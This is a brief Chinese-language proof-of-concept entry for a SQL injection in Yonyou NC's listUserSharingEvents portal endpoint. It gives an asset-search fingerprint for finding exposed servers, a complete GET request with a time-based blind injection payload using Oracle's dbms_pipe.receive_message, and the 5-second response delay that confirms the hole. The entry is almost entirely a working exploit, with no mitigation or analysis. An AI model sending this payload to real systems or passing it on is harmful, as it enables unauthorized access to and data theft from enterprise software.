# 用友NClistUserSharingEvents存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`GET /portal/pt/oacoSchedulerEvents/listUserSharingEvents?agent=1')+AND+1=dbms_pipe.receive_message('RDS',5)--&pageId=login&sch_ed=2&sch_sd=1 HTTP/1.1`
- **响应特征**：200 响应时间>=5s